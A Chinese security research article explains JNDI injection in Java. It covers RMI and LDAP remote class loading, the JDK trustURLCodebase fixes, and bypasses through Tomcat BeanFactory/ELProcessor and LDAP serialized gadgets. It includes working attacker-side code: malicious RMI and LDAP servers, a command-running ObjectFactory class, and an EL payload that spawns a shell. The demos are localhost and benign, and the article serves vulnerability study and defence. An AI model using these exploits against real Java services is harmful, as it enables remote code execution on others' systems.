**作者： 天融信阿尔法实验室**  
**原文链接：<https://mp.weixin.qq.com/s/TJTOh0q0OY-j6msP6XSErg>**

### 一、前言

在漏洞挖掘或利用的时候经常会遇见JNDI,本文会讲述什么是JNDI、JNDI中RMI的利用、LDAP的利用、JDK 8u191之后的利用方式。

### 二、JNDI简介

JNDI（The Java Naming and Directory
Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。

这些命名/目录服务提供者:

  * RMI (JAVA远程方法调用)
  * LDAP (轻量级目录访问协议)
  * CORBA (公共对象请求代理体系结构)
  * DNS (域名服务)

JNDI客户端调用方式

    
    
    //指定需要查找name名称
    String jndiName= "jndiName";
    //初始化默认环境
    Context context = new InitialContext();
    //查找该name的数据
    context.lookup(jndiName);

这里的jndiName变量的值可以是上面的命名/目录服务列表里面的值,如果JNDI名称可控的话可能会被攻击。

### 三、JNDI利用方式

#### RMI的利用

RMI是Java远程方法调用,是Java编程语言里,一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。想了解RMI的可以看下[这篇文章
](https://paper.seebug.org/1194/)

攻击者代码

    
    
    public static void main(String[] args) throws Exception {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference aa = new Reference("Calc", "Calc", "http://127.0.0.1:8081/");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
            registry.bind("hello", refObjWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

用web服务器来加载字节码,保存下面的这个java文件,用javac编译成.class字节码文件,在上传到web服务器上面。

    
    
    import java.lang.Runtime;
    import java.lang.Process;
    import javax.naming.Context;
    import javax.naming.Name;
    import javax.naming.spi.ObjectFactory;
    import java.util.Hashtable;
    
    public class Calc implements ObjectFactory {
        {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/Calc2"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
    
        static {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/Calc1"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
    
        public Calc() {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/Calc3"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
    
        @Override
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/Calc4"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
            return null;
        }
    }

被攻击者代码

    
    
    public static void main(String[] args) {
        try {
            String uri = "rmi://127.0.0.1:1099/hello";
            Context ctx = new InitialContext();
            ctx.lookup(uri);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

我这里使用jdk`1.8.0_102`版本运行之后,/tmp/目录下四个文件都会被创建,DEBUG看下原因。

`javax.naming.InitialContext#getURLOrDefaultInitCtx`

![](https://images.seebug.org/content/images/2020/05/a3060b15-c8b8-47f0-9d4b-24f01f4d6e9b.png-w331s)

343行getURLScheme方法解析协议名称,在345行NamingManager.getURLContext方法返回解析对应协议的对象

`com.sun.jndi.toolkit.url.GenericURLContext#lookup`

![](https://images.seebug.org/content/images/2020/05/855b48eb-226b-499c-a2b5-6210274039dd.png-w331s)

`com.sun.jndi.rmi.registry.RegistryContext#lookup`

![](https://images.seebug.org/content/images/2020/05/141cddd8-a1f6-4234-8f3f-1822d60833e2.png-w331s)

这里会去RMI注册中心寻找hello对象,接着看下当前类的`decodeObject`方法

![](https://images.seebug.org/content/images/2020/05/6dccb840-42b9-4142-bdb6-37a5dbb4a820.png-w331s)

因为`ReferenceWrapper`对象实现了`RemoteReference`接口,所以会调用`getReference`方法会获取`Reference`对象

`javax.naming.spi.NamingManager#getObjectFactoryFromReference`

![](https://images.seebug.org/content/images/2020/05/fa8a2f8f-e200-4138-ac16-9aec246ed9e9.png-w331s)

146行尝试从本地CLASSPATH获取该class,158行根据factoryName和codebase加载远程的class,跟进看下158行loadClass方法的实现

`com.sun.naming.internal.VersionHelper12#loadClass`

    
    
        public Class<?> loadClass(String className, String codebase)
                throws ClassNotFoundException, MalformedURLException {
    
            ClassLoader parent = getContextClassLoader();
            ClassLoader cl =
                     URLClassLoader.newInstance(getUrlArray(codebase), parent);
    
            return loadClass(className, cl);
        }
    
    
        Class<?> loadClass(String className, ClassLoader cl)
            throws ClassNotFoundException {
            Class<?> cls = Class.forName(className, true, cl);
            return cls;
        }

这里是通过URLClassLoader去加载远程类,此时观察web服务器日志会发现一条请求记录

![](https://images.seebug.org/content/images/2020/05/7b456828-91e1-4c00-ad48-22d1ad3e05da.png-w331s)

因为static在类加载的时候就会执行,所以这里会执行`touch /tmp/Calc1`命令,ls查看下.

![](https://images.seebug.org/content/images/2020/05/ffd9c7f3-83bb-48f9-ac0a-99da8194bbbc.png-w331s)

`javax.naming.spi.NamingManager#getObjectFactoryFromReference`163行执行`clas.newInstance()`的时候,代码块和无参构造方法都会执行,此时`Calc2`和`Calc3`文件都会创建成功,ls看下

![](https://images.seebug.org/content/images/2020/05/330b8ecd-a480-4baf-9a05-6f6ca8917f8c.png-w331s)

`javax.naming.spi.NamingManager#getObjectInstance`

![](https://images.seebug.org/content/images/2020/05/a2b15165-3cc9-4962-887b-3ddff522816f.png-w331s)

321行会调用`getObjectInstance`方法,此时`Calc4`文件会被创建,ls看下

![](https://images.seebug.org/content/images/2020/05/0210ce3f-352b-48e1-b093-6aa17bd8b679.png-w331s)

列下调用栈

    
    
    getObjectInstance:321, NamingManager (javax.naming.spi)
    decodeObject:464, RegistryContext (com.sun.jndi.rmi.registry)
    lookup:124, RegistryContext (com.sun.jndi.rmi.registry)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:417, InitialContext (javax.naming)
    main:46, HelloClient

这里总结下,加载远程类的时候static静态代码块,代码块,无参构造函数和getObjectInstance方法都会被调用.

我把jdk换成`1.8.0_181`版本看下

直接运行会提示这样的一个错误

![](https://images.seebug.org/content/images/2020/05/466f5ad6-f350-4982-8e9c-9c39ebb8ac72.png-w331s)

看下`com.sun.jndi.rmi.registry.RegistryContext.decodeObject`代码

![](https://images.seebug.org/content/images/2020/05/9bb4db73-20fd-4b2b-a87d-c8db6f3164e1.png-w331s)

354行var8是Reference对象,getFactoryClassLocation()方法是获取classFactoryLocation地址,这两个都不等于null,后面的trustURLCodebase取反,看下trustURLCodebase变量值

![](https://images.seebug.org/content/images/2020/05/ab991a3d-646a-459b-98ec-27b07a5aa49d.png-w331s)

在当前类静态代码块定义了trustURLCodebase的值为false,那么这一个条件也成立,所以会抛出错误。

在jdk`8u121` `7u131`
`6u141`版本开始默认com.sun.jndi.rmi.object.trustURLCodebase设置为false,rmi加载远程的字节码不会执行成功。

#### LDAP的利用

LDAP是基于X.500标准的轻量级目录访问协议,目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。

攻击者代码

先下载<https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1>LDAP SDK依赖,然后启动LDAP服务

    
    
    public class Ldap {
    
        private static final String LDAP_BASE = "dc=example,dc=com";
    
        public static void main(String[] argsx) {
            String[] args = new String[]{"http://127.0.0.1:8081/#Calc", "9999"};
            int port = 0;
            if (args.length < 1 || args[0].indexOf('#') < 0) {
                System.err.println(Ldap.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
                System.exit(-1);
            } else if (args.length > 1) {
                port = Integer.parseInt(args[1]);
            }
    
            try {
                InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                config.setListenerConfigs(new InMemoryListenerConfig(
                        "listen", //$NON-NLS-1$
                        InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                        port,
                        ServerSocketFactory.getDefault(),
                        SocketFactory.getDefault(),
                        (SSLSocketFactory) SSLSocketFactory.getDefault()));
    
                config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
                InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
                System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
                ds.startListening();
    
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    
        private static class OperationInterceptor extends InMemoryOperationInterceptor {
    
            private URL codebase;
    
            /**
             *
             */
            public OperationInterceptor(URL cb) {
                this.codebase = cb;
            }
    
            /**
             * {@inheritDoc}
             *
             * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
             */
            @Override
            public void processSearchResult(InMemoryInterceptedSearchResult result) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                } catch (Exception e1) {
                    e1.printStackTrace();
                }
    
            }
    
            protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
                URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
                System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
                e.addAttribute("javaClassName", "foo");
                String cbstring = this.codebase.toString();
                int refPos = cbstring.indexOf('#');
                if (refPos > 0) {
                    cbstring = cbstring.substring(0, refPos);
                }
                e.addAttribute("javaCodeBase", cbstring);
                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                e.addAttribute("javaFactory", this.codebase.getRef());
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
    
        }
    }

这里还是用上面RMI那里的web服务器来加载字节码

被攻击者代码

    
    
        public static void main(String[] args) {
            try {
                String uri = "ldap://127.0.0.1:9999/calc";
                Context ctx = new InitialContext();
                ctx.lookup(uri);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

这里使用jdk`1.8.0_181`版本运行之后,/tmp/目录下四个文件都会被创建,调用的过程和JNDI
RMI那块一样的,先解析协议,获取ldap协议的对象,寻找Reference中的factoryName对象,先尝试本地加载这个类,本地没有这个类用URLClassLoader远程进行加载...

列下调用栈

    
    
    loadClass:72, VersionHelper12 (com.sun.naming.internal)
    loadClass:87, VersionHelper12 (com.sun.naming.internal)
    getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
    getObjectInstance:189, DirectoryManager (javax.naming.spi)
    c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
    p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
    lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
    lookup:417, InitialContext (javax.naming)
    main:45, HelloClient

把JDK换成`1.8.0_241`版本运行看下,会发现/tmp/目录下的文件并没有创建成功,DEBUG看下.

`com.sun.naming.internal.VersionHelper12#loadClass`

![](https://images.seebug.org/content/images/2020/05/48eff897-f41c-4957-901e-a4675c3ef2ac.png-w331s)

101行判断了`trustURLCodebase`等于true才可以加载远程对象,而`trustURLCodebase`的默认值是false

![](https://images.seebug.org/content/images/2020/05/012bf5a2-81d3-410e-94df-45b6827bebdd.png-w331s)

在jdk`11.0.1`、`8u191`、`7u201`、`6u211`版本开始默认com.sun.jndi.ldap.object.trustURLCodebase设置为false,ldap加载远程的字节码不会执行成功。

#### 8u191之后

##### 使用本地的Reference Factory类

在`jdk8u191`之后RMI和LDAP默认都不能从远程加载类,还是可以在RMI和LDAP中获取对象。在前面我们分析过`javax.naming.spi.NamingManager#getObjectFactoryFromReference`方法,会先从本地的CLASSPATH中寻找该类,如果没有才会去远程加载。之后会执行静态代码块、代码块、无参构造函数和getObjectInstance方法。那么只需要在攻击者本地CLASSPATH找到这个Reference
Factory类并且在这四个地方其中一块能执行payload就可以了。Michael
Stepankin师傅在tomcat中找到`org.apache.naming.factory.BeanFactory#getObjectInstance`来进行利用。

tomcat
jar下载地址<https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core/8.5.11>

先看下poc

    
    
                Registry registry = LocateRegistry.createRegistry(1099);
                ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
                ref.add(new StringRefAddr("forceString", "x=eval"));
                ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app']).start()\")"));
                ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
                registry.bind("calc", referenceWrapper);

DEBUG看下漏洞原因

`org.apache.naming.factory.BeanFactory#getObjectInstance`

    
    
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws NamingException {
            if (obj instanceof ResourceRef) {
                NamingException ne;
                try {
                    Reference ref = (Reference)obj;
                    // 获取到的是javax.el.ELProcessor
                    String beanClassName = ref.getClassName();
                    Class<?> beanClass = null;
                    ClassLoader tcl = Thread.currentThread().getContextClassLoader();
                    if (tcl != null) {
                        try {
                                // 加载javax.el.ELProcessor类
                            beanClass = tcl.loadClass(beanClassName);
                        } catch (ClassNotFoundException var26) {
                        }
                    } else {
                        ...
                    }
    
                    if (beanClass == null) {
                        throw new NamingException("Class not found: " + beanClassName);
                    } else {
                        BeanInfo bi = Introspector.getBeanInfo(beanClass);
                        PropertyDescriptor[] pda = bi.getPropertyDescriptors();
                        Object bean = beanClass.newInstance();
                        //获取forceString属性的值{Type: forceString,Content: x=eval}
                        RefAddr ra = ref.get("forceString");
                        Map<String, Method> forced = new HashMap();
                        String value;
                        String propName;
                        int i;
                        if (ra != null) {
                            value = (String)ra.getContent();
                            Class<?>[] paramTypes = new Class[]{String.class};
                            String[] arr$ = value.split(",");
                            i = arr$.length;
    
                            for(int i$ = 0; i$ < i; ++i$) {
                                String param = arr$[i$];
                                param = param.trim();
                                //(char)61的值是=,获取=在字符串的位置
                                int index = param.indexOf(61);
                                if (index >= 0) {
                                        //eval  
                                    propName = param.substring(index + 1).trim();
                                    //x
                                    param = param.substring(0, index).trim();
                                } else {
                                    propName = "set" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);
                                }
    
                                try {
                                    //x=(ELProcessor.getMethod("eval",String[].class))
                                    forced.put(param, beanClass.getMethod(propName, paramTypes));
                                } catch (SecurityException | NoSuchMethodException var24) {
                                    ...
                                }
                            }
                        }
    
                        Enumeration e = ref.getAll();
    
                        while(true) {
                            ...
                                                            // "".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app']).start()")
                                value = (String)ra.getContent();
                                Object[] valueArray = new Object[1];
                                //eval method...
                                Method method = (Method)forced.get(propName);
                                if (method != null) {
                                    valueArray[0] = value;
    
                                    try {
                                            //反射执行ELProcessor.eval方法
                                        method.invoke(bean, valueArray);
                                    } catch (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) {
                                        throw new NamingException("Forced String setter " + method.getName() + " threw exception for property " + propName);
                                    }
                                } else {
                                    ...
                                }
                            }
                        }
                    }
                }
                ...
        }

我在这个类上面加了一些注释,ELProcessor.eval()会对EL表达式进行处理,最后会执行。

    
    
    "".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app']).start()")

##### 使用序列化数据,触发本地Gadget

`com.sun.jndi.ldap.Obj#decodeObject`

![](https://images.seebug.org/content/images/2020/05/ab98ac87-8c68-4dfd-b798-72ddd687970c.png-w331s)

这里可以看到在LDAP中数据可以是序列化对象也可以是Reference对象。如果是序列化对象会调用deserializeObject方法

`com.sun.jndi.ldap.Obj#deserializeObject`

![](https://images.seebug.org/content/images/2020/05/79512047-892d-4db2-9c5b-d75460555823.png-w331s)

该方法就是把byte用ObjectInputStream对数据进行反序列化还原。那么传输序列化对象的payload,客户端在这里就会进行触发.

改造下LDAP SERVER即可

    
    
            protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
                e.addAttribute("javaClassName", "foo");
                //getObject获取Gadget
                e.addAttribute("javaSerializedData", serializeObject(getObject(this.cmd)));
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }

调用链

    
    
    readObject:1170, Hashtable (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1170, ObjectStreamClass (java.io)
    readSerialData:2232, ObjectInputStream (java.io)
    readOrdinaryObject:2123, ObjectInputStream (java.io)
    readObject0:1624, ObjectInputStream (java.io)
    readObject:464, ObjectInputStream (java.io)
    readObject:422, ObjectInputStream (java.io)
    deserializeObject:531, Obj (com.sun.jndi.ldap)
    decodeObject:239, Obj (com.sun.jndi.ldap)
    c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
    p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
    lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
    lookup:417, InitialContext (javax.naming)
    main:43, HelloClient

### 四、总结

JNDI注入漏洞很常见,在`fastjson`/`jackson`中会调用getter/setter方法,如果在getter/setter方法中存在lookup方法并且参数可控就可以利用,可以看下`jackson`的黑名单<https://github.com/FasterXML/jackson-databind/blob/master/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java>来学习哪些类可以拿来JNDI注入。在`weblogic
t3`协议中基于序列化数据传输,那么会自动调用readObject方法,`weblogic`使用了`Spring`框架`JtaTransactionManager`类,这个类的readObject方法也存在JNDI注入调用链。

### 参考链接

  1. <https://www.veracode.com/blog/research/exploiting-jndi-injections-java>

  2. <https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html>

  3. <https://www.anquanke.com/post/id/201181>

  4. <https://xz.aliyun.com/t/7264>

  5. <https://xz.aliyun.com/t/6633>

  6. <https://mp.weixin.qq.com/s/0LePKo8k7HDIjk9ci8dQtA>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1207/>

